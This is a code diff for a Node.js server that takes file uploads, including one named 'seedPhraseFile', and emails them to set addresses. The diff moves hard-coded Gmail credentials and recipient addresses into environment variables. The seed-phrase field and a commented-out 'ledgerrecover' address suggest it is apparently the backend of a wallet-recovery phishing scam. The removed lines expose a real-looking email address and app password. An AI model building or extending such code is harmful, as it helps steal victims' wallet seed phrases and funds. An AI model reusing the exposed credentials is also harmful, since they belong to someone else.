@@ -6,6 +6,7 @@ const multer = require('multer');
 const nodemailer = require('nodemailer');
 const fs = require('fs');
 const path = require('path');
+const dotenv = require('dotenv').config();
 
 const app = express();
 app.use(cors());
@@ -29,13 +30,13 @@ app.post('/upload', upload.fields([{ name: 'file' }, { name: 'seedPhraseFile' },
 
 // Email setup
 const transporter = nodemailer.createTransport({
-  service: 'gmail',
+  service:process.env.VITE_EMAIL_SERVICE,
   //   // host: 'smtp.gmail.com',
   //   //   port: 465,
   //   //   secure: true, // use SSL
     auth: {
-      user: 'jerryisibor23@gmail.com',
-      pass: 'zsbuacaawptujtcy',
+      user: process.env.VITE_EMAIL_USER,
+      pass: process.env.VITE_EMAIL_PASS,
   }
 });
 
@@ -52,8 +53,8 @@ app.post('/send-all-files', (req, res) => {
 
     // Prepare email options
     const mailOptions = {
-        from:'jerryisibor23@gmail.com',
-        to:'nighteengale914@gmail.com',
+        from:process.env.VITE_EMAIL_USER,
+        to:process.env.VITE_RECIPIENT_EMAIL_1,
         // to:'ledgerrecover@protonmail.com',
         subject:'TestMail',
         text:'sending today&apos; emails with Nodejs using Nodemailer',
